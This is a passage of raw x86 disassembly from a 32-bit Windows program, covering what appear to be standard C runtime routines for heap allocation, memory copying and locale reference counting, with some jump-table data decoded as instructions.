  425ff1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ff5:	call   0x42602d
  425ffa:	mov    eax,DWORD PTR [ebp-0x1c]
  425ffd:	test   eax,eax
  425fff:	jne    0x426024
  426001:	test   esi,esi
  426003:	jne    0x426006
  426005:	inc    esi
  426006:	cmp    DWORD PTR ds:0x45e144,0x1
  42600d:	je     0x426015
  42600f:	add    esi,0xf
  426012:	and    esi,0xfffffff0
  426015:	push   esi
  426016:	push   0x0
  426018:	push   DWORD PTR ds:0x45e140
  42601e:	call   DWORD PTR ds:0x429030
  426024:	call   0x42537b
  426029:	ret    
  42602a:	mov    esi,DWORD PTR [ebp+0x8]
  42602d:	push   0x4
  42602f:	call   0x42546b
  426034:	pop    ecx
  426035:	ret    
  426036:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42603b:	ja     0x42605f
  42603d:	push   DWORD PTR [esp+0x4]
  426041:	call   0x425fbb
  426046:	test   eax,eax
  426048:	pop    ecx
  426049:	jne    0x426061
  42604b:	cmp    DWORD PTR [esp+0x8],eax
  42604f:	je     0x426061
  426051:	push   DWORD PTR [esp+0x4]
  426055:	call   0x427c22
  42605a:	test   eax,eax
  42605c:	pop    ecx
  42605d:	jne    0x42603d
  42605f:	xor    eax,eax
  426061:	ret    
  426062:	push   DWORD PTR ds:0x45ddc8
  426068:	push   DWORD PTR [esp+0x8]
  42606c:	call   0x426036
  426071:	pop    ecx
  426072:	pop    ecx
  426073:	ret    
  426074:	int3   
  426075:	int3   
  426076:	int3   
  426077:	int3   
  426078:	int3   
  426079:	int3   
  42607a:	int3   
  42607b:	int3   
  42607c:	int3   
  42607d:	int3   
  42607e:	int3   
  42607f:	int3   
  426080:	push   ebp
  426081:	mov    ebp,esp
  426083:	push   edi
  426084:	push   esi
  426085:	mov    esi,DWORD PTR [ebp+0xc]
  426088:	mov    ecx,DWORD PTR [ebp+0x10]
  42608b:	mov    edi,DWORD PTR [ebp+0x8]
  42608e:	mov    eax,ecx
  426090:	mov    edx,ecx
  426092:	add    eax,esi
  426094:	cmp    edi,esi
  426096:	jbe    0x4260a0
  426098:	cmp    edi,eax
  42609a:	jb     0x42621c
  4260a0:	test   edi,0x3
  4260a6:	jne    0x4260bc
  4260a8:	shr    ecx,0x2
  4260ab:	and    edx,0x3
  4260ae:	cmp    ecx,0x8
  4260b1:	jb     0x4260dc
  4260b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260b5:	jmp    DWORD PTR [edx*4+0x4261cc]
  4260bc:	mov    eax,edi
  4260be:	mov    edx,0x3
  4260c3:	sub    ecx,0x4
  4260c6:	jb     0x4260d4
  4260c8:	and    eax,0x3
  4260cb:	add    ecx,eax
  4260cd:	jmp    DWORD PTR [eax*4+0x4260e0]
  4260d4:	jmp    DWORD PTR [ecx*4+0x4261dc]
  4260db:	nop
  4260dc:	jmp    DWORD PTR [ecx*4+0x426160]
  4260e3:	nop
  4260e4:	lock pusha 
  4260e6:	inc    edx
  4260e7:	add    BYTE PTR [ecx+eiz*2],bl
  4260ea:	inc    edx
  4260eb:	add    BYTE PTR [eax+0x61],al
  4260ee:	inc    edx
  4260ef:	add    BYTE PTR [ebx],ah
  4260f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4260f7:	inc    esi
  4260f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4260fe:	add    al,cl
  426100:	jmp    0x289e907
  426105:	add    esi,0x3
  426108:	add    edi,0x3
  42610b:	cmp    ecx,0x8
  42610e:	jb     0x4260dc
  426110:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	jmp    DWORD PTR [edx*4+0x4261cc]
  426119:	lea    ecx,[ecx+0x0]
  42611c:	and    edx,ecx
  42611e:	mov    al,BYTE PTR [esi]
  426120:	mov    BYTE PTR [edi],al
  426122:	mov    al,BYTE PTR [esi+0x1]
  426125:	shr    ecx,0x2
  426128:	mov    BYTE PTR [edi+0x1],al
  42612b:	add    esi,0x2
  42612e:	add    edi,0x2
  426131:	cmp    ecx,0x8
  426134:	jb     0x4260dc
  426136:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426138:	jmp    DWORD PTR [edx*4+0x4261cc]
  42613f:	nop
  426140:	and    edx,ecx
  426142:	mov    al,BYTE PTR [esi]
  426144:	mov    BYTE PTR [edi],al
  426146:	add    esi,0x1
  426149:	shr    ecx,0x2
  42614c:	add    edi,0x1
  42614f:	cmp    ecx,0x8
  426152:	jb     0x4260dc
  426154:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426156:	jmp    DWORD PTR [edx*4+0x4261cc]
  42615d:	lea    ecx,[ecx+0x0]
  426160:	ret    
  426161:	popa   
  426162:	inc    edx
  426163:	add    BYTE PTR [eax-0x57ffbd9f],dh
  426169:	popa   
  42616a:	inc    edx
  42616b:	add    BYTE PTR [eax-0x67ffbd9f],ah
  426171:	popa   
  426172:	inc    edx
  426173:	add    BYTE PTR [eax-0x77ffbd9f],dl
  426179:	popa   
  42617a:	inc    edx
  42617b:	add    BYTE PTR [eax-0x74ffbd9f],al
  426181:	inc    esp
  426182:	mov    fs,esp
  426184:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426188:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42618c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426190:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426194:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426198:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42619c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261b8:	lea    eax,[ecx*4+0x0]
  4261bf:	add    esi,eax
  4261c1:	add    edi,eax
  4261c3:	jmp    DWORD PTR [edx*4+0x4261cc]
  4261ca:	mov    edi,edi
  4261cc:	fsub   QWORD PTR [ecx+0x42]
  4261cf:	add    ah,ah
  4261d1:	popa   
  4261d2:	inc    edx
  4261d3:	add    al,dh
  4261d5:	popa   
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],al
  4261da:	inc    edx
  4261db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261e1:	leave  
  4261e2:	ret    
  4261e3:	nop
  4261e4:	mov    al,BYTE PTR [esi]
  4261e6:	mov    BYTE PTR [edi],al
  4261e8:	mov    eax,DWORD PTR [ebp+0x8]
  4261eb:	pop    esi
  4261ec:	pop    edi
  4261ed:	leave  
  4261ee:	ret    
  4261ef:	nop
  4261f0:	mov    al,BYTE PTR [esi]
  4261f2:	mov    BYTE PTR [edi],al
  4261f4:	mov    al,BYTE PTR [esi+0x1]
  4261f7:	mov    BYTE PTR [edi+0x1],al
  4261fa:	mov    eax,DWORD PTR [ebp+0x8]
  4261fd:	pop    esi
  4261fe:	pop    edi
  4261ff:	leave  
  426200:	ret    
  426201:	lea    ecx,[ecx+0x0]
  426204:	mov    al,BYTE PTR [esi]
  426206:	mov    BYTE PTR [edi],al
  426208:	mov    al,BYTE PTR [esi+0x1]
  42620b:	mov    BYTE PTR [edi+0x1],al
  42620e:	mov    al,BYTE PTR [esi+0x2]
  426211:	mov    BYTE PTR [edi+0x2],al
  426214:	mov    eax,DWORD PTR [ebp+0x8]
  426217:	pop    esi
  426218:	pop    edi
  426219:	leave  
  42621a:	ret    
  42621b:	nop
  42621c:	lea    esi,[ecx+esi*1-0x4]
  426220:	lea    edi,[ecx+edi*1-0x4]
  426224:	test   edi,0x3
  42622a:	jne    0x426250
  42622c:	shr    ecx,0x2
  42622f:	and    edx,0x3
  426232:	cmp    ecx,0x8
  426235:	jb     0x426244
  426237:	std    
  426238:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42623a:	cld    
  42623b:	jmp    DWORD PTR [edx*4+0x426368]
  426242:	mov    edi,edi
  426244:	neg    ecx
  426246:	jmp    DWORD PTR [ecx*4+0x426318]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    eax,edi
  426252:	mov    edx,0x3
  426257:	cmp    ecx,0x4
  42625a:	jb     0x426268
  42625c:	and    eax,0x3
  42625f:	sub    ecx,eax
  426261:	jmp    DWORD PTR [eax*4+0x42626c]
  426268:	jmp    DWORD PTR [ecx*4+0x426368]
  42626f:	nop
  426270:	jl     0x4262d4
  426272:	inc    edx
  426273:	add    BYTE PTR [eax-0x37ffbd9e],ah
  426279:	bound  eax,QWORD PTR [edx+0x0]
  42627c:	mov    al,BYTE PTR [esi+0x3]
  42627f:	and    edx,ecx
  426281:	mov    BYTE PTR [edi+0x3],al
  426284:	sub    esi,0x1
  426287:	shr    ecx,0x2
  42628a:	sub    edi,0x1
  42628d:	cmp    ecx,0x8
  426290:	jb     0x426244
  426292:	std    
  426293:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426295:	cld    
  426296:	jmp    DWORD PTR [edx*4+0x426368]
  42629d:	lea    ecx,[ecx+0x0]
  4262a0:	mov    al,BYTE PTR [esi+0x3]
  4262a3:	and    edx,ecx
  4262a5:	mov    BYTE PTR [edi+0x3],al
  4262a8:	mov    al,BYTE PTR [esi+0x2]
  4262ab:	shr    ecx,0x2
  4262ae:	mov    BYTE PTR [edi+0x2],al
  4262b1:	sub    esi,0x2
  4262b4:	sub    edi,0x2
  4262b7:	cmp    ecx,0x8
  4262ba:	jb     0x426244
  4262bc:	std    
  4262bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262bf:	cld    
  4262c0:	jmp    DWORD PTR [edx*4+0x426368]
  4262c7:	nop
  4262c8:	mov    al,BYTE PTR [esi+0x3]
  4262cb:	and    edx,ecx
  4262cd:	mov    BYTE PTR [edi+0x3],al
  4262d0:	mov    al,BYTE PTR [esi+0x2]
  4262d3:	mov    BYTE PTR [edi+0x2],al
  4262d6:	mov    al,BYTE PTR [esi+0x1]
  4262d9:	shr    ecx,0x2
  4262dc:	mov    BYTE PTR [edi+0x1],al
  4262df:	sub    esi,0x3
  4262e2:	sub    edi,0x3
  4262e5:	cmp    ecx,0x8
  4262e8:	jb     0x426244
  4262ee:	std    
  4262ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f1:	cld    
  4262f2:	jmp    DWORD PTR [edx*4+0x426368]
  4262f9:	lea    ecx,[ecx+0x0]
  4262fc:	sbb    al,0x63
  4262fe:	inc    edx
  4262ff:	add    BYTE PTR [ebx+eiz*2],ah
  426302:	inc    edx
  426303:	add    BYTE PTR [ebx+eiz*2],ch
  426306:	inc    edx
  426307:	add    BYTE PTR [ebx+eiz*2],dh
  42630a:	inc    edx
  42630b:	add    BYTE PTR [ebx+eiz*2],bh
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2+0x42],al
  426313:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  426317:	add    BYTE PTR [edi+0x63],bl
  42631a:	inc    edx
  42631b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426321:	inc    esp
  426322:	(bad)  
  426323:	sbb    al,0x8b
  426325:	inc    esp
  426326:	mov    ds,WORD PTR [eax]
  426328:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42632c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426330:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426334:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426338:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426340:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426348:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426350:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426354:	lea    eax,[ecx*4+0x0]
  42635b:	add    esi,eax
  42635d:	add    edi,eax
  42635f:	jmp    DWORD PTR [edx*4+0x426368]
  426366:	mov    edi,edi
  426368:	js     0x4263cd
  42636a:	inc    edx
  42636b:	add    BYTE PTR [eax-0x6fffbd9d],al
  426371:	arpl   WORD PTR [edx+0x0],ax
  426374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426375:	arpl   WORD PTR [edx+0x0],ax
  426378:	mov    eax,DWORD PTR [ebp+0x8]
  42637b:	pop    esi
  42637c:	pop    edi
  42637d:	leave  
  42637e:	ret    
  42637f:	nop
  426380:	mov    al,BYTE PTR [esi+0x3]
  426383:	mov    BYTE PTR [edi+0x3],al
  426386:	mov    eax,DWORD PTR [ebp+0x8]
  426389:	pop    esi
  42638a:	pop    edi
  42638b:	leave  
  42638c:	ret    
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    al,BYTE PTR [esi+0x2]
  426399:	mov    BYTE PTR [edi+0x2],al
  42639c:	mov    eax,DWORD PTR [ebp+0x8]
  42639f:	pop    esi
  4263a0:	pop    edi
  4263a1:	leave  
  4263a2:	ret    
  4263a3:	nop
  4263a4:	mov    al,BYTE PTR [esi+0x3]
  4263a7:	mov    BYTE PTR [edi+0x3],al
  4263aa:	mov    al,BYTE PTR [esi+0x2]
  4263ad:	mov    BYTE PTR [edi+0x2],al
  4263b0:	mov    al,BYTE PTR [esi+0x1]
  4263b3:	mov    BYTE PTR [edi+0x1],al
  4263b6:	mov    eax,DWORD PTR [ebp+0x8]
  4263b9:	pop    esi
  4263ba:	pop    edi
  4263bb:	leave  
  4263bc:	ret    
  4263bd:	push   DWORD PTR [esp+0x4]
  4263c1:	call   DWORD PTR ds:0x4290c8
  4263c7:	xor    eax,eax
  4263c9:	inc    eax
  4263ca:	ret    0x8
  4263cd:	push   0x10
  4263cf:	push   0x4296c8
  4263d4:	call   0x425340
  4263d9:	mov    eax,ds:0x45dd88
  4263de:	test   eax,eax
  4263e0:	jne    0x426419
  4263e2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263e9:	je     0x42640f
  4263eb:	push   0x4296b4
  4263f0:	call   DWORD PTR ds:0x429024
  4263f6:	test   eax,eax
  4263f8:	je     0x42640f
  4263fa:	push   0x42968c
  4263ff:	push   eax
  426400:	call   DWORD PTR ds:0x429020
  426406:	mov    ds:0x45dd88,eax
  42640b:	test   eax,eax
  42640d:	jne    0x426419
  42640f:	mov    eax,0x4263bd
  426414:	mov    ds:0x45dd88,eax
  426419:	and    DWORD PTR [ebp-0x4],0x0
  42641d:	push   DWORD PTR [ebp+0xc]
  426420:	push   DWORD PTR [ebp+0x8]
  426423:	call   eax
  426425:	mov    DWORD PTR [ebp-0x1c],eax
  426428:	jmp    0x42644e
  42642a:	mov    eax,DWORD PTR [ebp-0x14]
  42642d:	mov    eax,DWORD PTR [eax]
  42642f:	mov    eax,DWORD PTR [eax]
  426431:	mov    DWORD PTR [ebp-0x20],eax
  426434:	xor    eax,eax
  426436:	inc    eax
  426437:	ret    
  426438:	mov    esp,DWORD PTR [ebp-0x18]
  42643b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426442:	jne    0x42644c
  426444:	push   0x8
  426446:	call   DWORD PTR ds:0x429094
  42644c:	xor    eax,eax
  42644e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426452:	call   0x42537b
  426457:	ret    
  426458:	push   0x10
  42645a:	push   0x4296d8
  42645f:	call   0x425340
  426464:	mov    esi,DWORD PTR [ebp+0x8]
  426467:	imul   esi,DWORD PTR [ebp+0xc]
  42646b:	mov    DWORD PTR [ebp-0x1c],esi
  42646e:	test   esi,esi
  426470:	jne    0x426473
  426472:	inc    esi
  426473:	xor    edi,edi
  426475:	mov    DWORD PTR [ebp-0x20],edi
  426478:	cmp    esi,0xffffffe0
  42647b:	ja     0x4264e2
  42647d:	cmp    DWORD PTR ds:0x45e144,0x3
  426484:	jne    0x4264cd
  426486:	add    esi,0xf
  426489:	and    esi,0xfffffff0
  42648c:	mov    DWORD PTR [ebp+0xc],esi
  42648f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426492:	cmp    ebx,DWORD PTR ds:0x45df04
  426498:	ja     0x4264cd
  42649a:	push   0x4
  42649c:	call   0x4254ff
  4264a1:	pop    ecx
  4264a2:	and    DWORD PTR [ebp-0x4],edi
  4264a5:	push   ebx
  4264a6:	call   0x426f01
  4264ab:	pop    ecx
  4264ac:	mov    DWORD PTR [ebp-0x20],eax
  4264af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264b3:	call   0x426502
  4264b8:	mov    edi,DWORD PTR [ebp-0x20]
  4264bb:	test   edi,edi
  4264bd:	je     0x4264d1
  4264bf:	push   DWORD PTR [ebp-0x1c]
  4264c2:	push   0x0
  4264c4:	push   edi
  4264c5:	call   0x427c40
  4264ca:	add    esp,0xc
  4264cd:	test   edi,edi
  4264cf:	jne    0x42650b
  4264d1:	push   esi
  4264d2:	push   0x8
  4264d4:	push   DWORD PTR ds:0x45e140
  4264da:	call   DWORD PTR ds:0x429030
  4264e0:	mov    edi,eax
  4264e2:	test   edi,edi
  4264e4:	jne    0x42650b
  4264e6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264ec:	je     0x42650b
  4264ee:	push   esi
  4264ef:	call   0x427c22
  4264f4:	pop    ecx
  4264f5:	test   eax,eax
  4264f7:	jne    0x426473
  4264fd:	jmp    0x42650d
  4264ff:	mov    esi,DWORD PTR [ebp+0xc]
  426502:	push   0x4
  426504:	call   0x42546b
  426509:	pop    ecx
  42650a:	ret    
  42650b:	mov    eax,edi
  42650d:	call   0x42537b
  426512:	ret    
  426513:	push   esi
  426514:	mov    esi,DWORD PTR [esp+0x8]
  426518:	mov    eax,DWORD PTR [esi+0x3c]
  42651b:	push   edi
  42651c:	xor    edi,edi
  42651e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426524:	je     0x426589
  426526:	cmp    eax,edi
  426528:	je     0x426589
  42652a:	mov    eax,DWORD PTR [esi+0x2c]
  42652d:	cmp    DWORD PTR [eax],edi
  42652f:	jne    0x426589
  426531:	mov    eax,DWORD PTR [esi+0x34]
  426534:	cmp    eax,edi
  426536:	je     0x426554
  426538:	cmp    DWORD PTR [eax],edi
  42653a:	jne    0x426554
  42653c:	cmp    eax,DWORD PTR ds:0x45def0
  426542:	je     0x426554
  426544:	push   eax
  426545:	call   0x425f4a
  42654a:	push   DWORD PTR [esi+0x3c]
  42654d:	call   0x427e8f
  426552:	pop    ecx
  426553:	pop    ecx
  426554:	mov    eax,DWORD PTR [esi+0x30]
  426557:	cmp    eax,edi
  426559:	je     0x426577
  42655b:	cmp    DWORD PTR [eax],edi
  42655d:	jne    0x426577
  42655f:	cmp    eax,DWORD PTR ds:0x45def4
  426565:	je     0x426577
  426567:	push   eax
  426568:	call   0x425f4a
  42656d:	push   DWORD PTR [esi+0x3c]
  426570:	call   0x427e30
  426575:	pop    ecx
  426576:	pop    ecx
  426577:	push   DWORD PTR [esi+0x2c]
  42657a:	call   0x425f4a
  42657f:	push   DWORD PTR [esi+0x3c]
  426582:	call   0x425f4a
  426587:	pop    ecx
  426588:	pop    ecx
  426589:	mov    eax,DWORD PTR [esi+0x40]
  42658c:	cmp    eax,DWORD PTR ds:0x45deec
  426592:	je     0x4265ac
  426594:	cmp    eax,edi
  426596:	je     0x4265ac
  426598:	cmp    DWORD PTR [eax],edi
  42659a:	jne    0x4265ac
  42659c:	push   eax
  42659d:	call   0x425f4a
  4265a2:	push   DWORD PTR [esi+0x44]
  4265a5:	call   0x425f4a
  4265aa:	pop    ecx
  4265ab:	pop    ecx
  4265ac:	mov    eax,DWORD PTR [esi+0x50]
  4265af:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265b5:	je     0x4265d3
  4265b7:	cmp    eax,edi
  4265b9:	je     0x4265d3
  4265bb:	cmp    DWORD PTR [eax+0xb4],edi
  4265c1:	jne    0x4265d3
  4265c3:	push   eax
  4265c4:	call   0x427ca0
  4265c9:	push   DWORD PTR [esi+0x50]
  4265cc:	call   0x425f4a
  4265d1:	pop    ecx
  4265d2:	pop    ecx
  4265d3:	push   esi
  4265d4:	call   0x425f4a
  4265d9:	pop    ecx
  4265da:	pop    edi
  4265db:	pop    esi
  4265dc:	ret    
  4265dd:	push   esi
  4265de:	call   0x4251f3
  4265e3:	mov    esi,eax
  4265e5:	mov    eax,DWORD PTR [esi+0x64]
  4265e8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265ee:	je     0x42669a
  4265f4:	test   eax,eax
  4265f6:	je     0x426627
  4265f8:	mov    ecx,DWORD PTR [eax+0x2c]
  4265fb:	dec    DWORD PTR [eax]
  4265fd:	test   ecx,ecx
  4265ff:	je     0x426603
  426601:	dec    DWORD PTR [ecx]
  426603:	mov    ecx,DWORD PTR [eax+0x34]
  426606:	test   ecx,ecx
  426608:	je     0x42660c
  42660a:	dec    DWORD PTR [ecx]
  42660c:	mov    ecx,DWORD PTR [eax+0x30]
  42660f:	test   ecx,ecx
  426611:	je     0x426615
  426613:	dec    DWORD PTR [ecx]
  426615:	mov    ecx,DWORD PTR [eax+0x40]
  426618:	test   ecx,ecx
  42661a:	je     0x42661e
  42661c:	dec    DWORD PTR [ecx]
  42661e:	mov    ecx,DWORD PTR [eax+0x4c]
  426621:	dec    DWORD PTR [ecx+0xb4]
  426627:	mov    ecx,DWORD PTR ds:0x45d58c
  42662d:	mov    DWORD PTR [esi+0x64],ecx
  426630:	mov    ecx,DWORD PTR ds:0x45d58c
  426636:	inc    DWORD PTR [ecx]
  426638:	mov    ecx,DWORD PTR ds:0x45d58c
  42663e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426641:	test   ecx,ecx
  426643:	je     0x426647
  426645:	inc    DWORD PTR [ecx]
  426647:	mov    ecx,DWORD PTR ds:0x45d58c
  42664d:	mov    ecx,DWORD PTR [ecx+0x34]
  426650:	test   ecx,ecx
  426652:	je     0x426656
  426654:	inc    DWORD PTR [ecx]
  426656:	mov    ecx,DWORD PTR ds:0x45d58c
  42665c:	mov    ecx,DWORD PTR [ecx+0x30]
  42665f:	test   ecx,ecx
  426661:	je     0x426665
  426663:	inc    DWORD PTR [ecx]
  426665:	mov    ecx,DWORD PTR ds:0x45d58c
  42666b:	mov    ecx,DWORD PTR [ecx+0x40]
  42666e:	test   ecx,ecx
  426670:	je     0x426674
  426672:	inc    DWORD PTR [ecx]
  426674:	mov    ecx,DWORD PTR ds:0x45d58c
  42667a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42667d:	inc    DWORD PTR [ecx+0xb4]
  426683:	test   eax,eax
  426685:	je     0x42669a
  426687:	cmp    DWORD PTR [eax],0x0
  42668a:	jne    0x42669a
  42668c:	cmp    eax,0x45d538
  426691:	je     0x42669a
  426693:	push   eax
  426694:	call   0x426513
  426699:	pop    ecx
  42669a:	mov    eax,DWORD PTR [esi+0x64]
  42669d:	pop    esi
  42669e:	ret    
  42669f:	push   0xc
  4266a1:	push   0x429868
  4266a6:	call   0x425340
  4266ab:	push   0xc
  4266ad:	call   0x4254ff
  4266b2:	pop    ecx
  4266b3:	and    DWORD PTR [ebp-0x4],0x0
  4266b7:	call   0x4265dd
  4266bc:	mov    DWORD PTR [ebp-0x1c],eax
  4266bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266c3:	call   0x4266d1
  4266c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266cb:	call   0x42537b
  4266d0:	ret    
  4266d1:	push   0xc
  4266d3:	call   0x42546b
  4266d8:	pop    ecx
  4266d9:	ret    
  4266da:	push   0x140
  4266df:	push   0x0
  4266e1:	push   DWORD PTR ds:0x45e140
  4266e7:	call   DWORD PTR ds:0x429030
  4266ed:	test   eax,eax
  4266ef:	mov    ds:0x45df00,eax
  4266f4:	jne    0x4266f7
  4266f6:	ret    
  4266f7:	mov    ecx,DWORD PTR [esp+0x4]
  4266fb:	and    DWORD PTR ds:0x45def8,0x0
  426702:	and    DWORD PTR ds:0x45defc,0x0
  426709:	mov    ds:0x45df08,eax
  42670e:	xor    eax,eax
  426710:	mov    DWORD PTR ds:0x45df04,ecx
  426716:	mov    DWORD PTR ds:0x45df0c,0x10
  426720:	inc    eax
  426721:	ret    
  426722:	mov    eax,ds:0x45defc
  426727:	lea    ecx,[eax+eax*4]
  42672a:	mov    eax,ds:0x45df00
  42672f:	lea    ecx,[eax+ecx*4]
  426732:	jmp    0x426746
  426734:	mov    edx,DWORD PTR [esp+0x4]
  426738:	sub    edx,DWORD PTR [eax+0xc]
  42673b:	cmp    edx,0x100000
  426741:	jb     0x42674c
  426743:	add    eax,0x14
  426746:	cmp    eax,ecx
  426748:	jb     0x426734
  42674a:	xor    eax,eax
  42674c:	ret    
  42674d:	push   ebp
  42674e:	mov    ebp,esp
  426750:	sub    esp,0x10
  426753:	mov    ecx,DWORD PTR [ebp+0x8]
  426756:	mov    eax,DWORD PTR [ecx+0x10]
  426759:	push   esi
  42675a:	mov    esi,DWORD PTR [ebp+0xc]
  42675d:	push   edi
  42675e:	mov    edi,esi
  426760:	sub    edi,DWORD PTR [ecx+0xc]
  426763:	add    esi,0xfffffffc
  426766:	shr    edi,0xf
  426769:	mov    ecx,edi
  42676b:	imul   ecx,ecx,0x204
  426771:	lea    ecx,[ecx+eax*1+0x144]
  426778:	mov    DWORD PTR [ebp-0x10],ecx
  42677b:	mov    ecx,DWORD PTR [esi]
  42677d:	dec    ecx
  42677e:	test   cl,0x1
  426781:	mov    DWORD PTR [ebp-0x4],ecx
  426784:	jne    0x426a61
  42678a:	push   ebx
  42678b:	lea    ebx,[ecx+esi*1]
  42678e:	mov    edx,DWORD PTR [ebx]
  426790:	mov    DWORD PTR [ebp-0xc],edx
  426793:	mov    edx,DWORD PTR [esi-0x4]
  426796:	mov    DWORD PTR [ebp-0x8],edx
  426799:	mov    edx,DWORD PTR [ebp-0xc]
  42679c:	test   dl,0x1
  42679f:	mov    DWORD PTR [ebp+0xc],ebx
  4267a2:	jne    0x426818
  4267a4:	sar    edx,0x4
  4267a7:	dec    edx
  4267a8:	cmp    edx,0x3f
  4267ab:	jbe    0x4267b0
  4267ad:	push   0x3f
  4267af:	pop    edx
  4267b0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267b3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267b6:	jne    0x4267fa
  4267b8:	cmp    edx,0x20
  4267bb:	mov    ebx,0x80000000
  4267c0:	jae    0x4267db
  4267c2:	mov    ecx,edx
  4267c4:	shr    ebx,cl
  4267c6:	lea    ecx,[edx+eax*1+0x4]
  4267ca:	not    ebx
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267d0:	dec    BYTE PTR [ecx]
  4267d2:	jne    0x4267f7
  4267d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d7:	and    DWORD PTR [ecx],ebx
  4267d9:	jmp    0x4267f7
  4267db:	lea    ecx,[edx-0x20]
  4267de:	shr    ebx,cl
  4267e0:	lea    ecx,[edx+eax*1+0x4]
  4267e4:	not    ebx
  4267e6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267ed:	dec    BYTE PTR [ecx]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],ebx
  4267f7:	mov    ebx,DWORD PTR [ebp+0xc]
  4267fa:	mov    edx,DWORD PTR [ebx+0x8]
  4267fd:	mov    ebx,DWORD PTR [ebx+0x4]
  426800:	mov    ecx,DWORD PTR [ebp-0x4]
  426803:	add    ecx,DWORD PTR [ebp-0xc]
  426806:	mov    DWORD PTR [edx+0x4],ebx
  426809:	mov    edx,DWORD PTR [ebp+0xc]
  42680c:	mov    ebx,DWORD PTR [edx+0x4]
  42680f:	mov    edx,DWORD PTR [edx+0x8]
  426812:	mov    DWORD PTR [ebx+0x8],edx
  426815:	mov    DWORD PTR [ebp-0x4],ecx
  426818:	mov    edx,ecx
  42681a:	sar    edx,0x4
  42681d:	dec    edx
  42681e:	cmp    edx,0x3f
  426821:	jbe    0x426826
  426823:	push   0x3f
  426825:	pop    edx
  426826:	mov    ebx,DWORD PTR [ebp-0x8]
  426829:	and    ebx,0x1
  42682c:	mov    DWORD PTR [ebp-0xc],ebx
  42682f:	jne    0x4268c4
  426835:	sub    esi,DWORD PTR [ebp-0x8]
  426838:	mov    ebx,DWORD PTR [ebp-0x8]
  42683b:	sar    ebx,0x4
  42683e:	push   0x3f
  426840:	mov    DWORD PTR [ebp+0xc],esi
  426843:	dec    ebx
  426844:	pop    esi
  426845:	cmp    ebx,esi
  426847:	jbe    0x42684b
  426849:	mov    ebx,esi
  42684b:	add    ecx,DWORD PTR [ebp-0x8]
  42684e:	mov    edx,ecx
  426850:	sar    edx,0x4
  426853:	dec    edx
  426854:	cmp    edx,esi
  426856:	mov    DWORD PTR [ebp-0x4],ecx
  426859:	jbe    0x42685d
  42685b:	mov    edx,esi
  42685d:	cmp    ebx,edx
  42685f:	je     0x4268bf
  426861:	mov    ecx,DWORD PTR [ebp+0xc]
  426864:	mov    esi,DWORD PTR [ecx+0x4]
  426867:	cmp    esi,DWORD PTR [ecx+0x8]
  42686a:	jne    0x4268a7
  42686c:	cmp    ebx,0x20
  42686f:	mov    esi,0x80000000
  426874:	jae    0x42688d
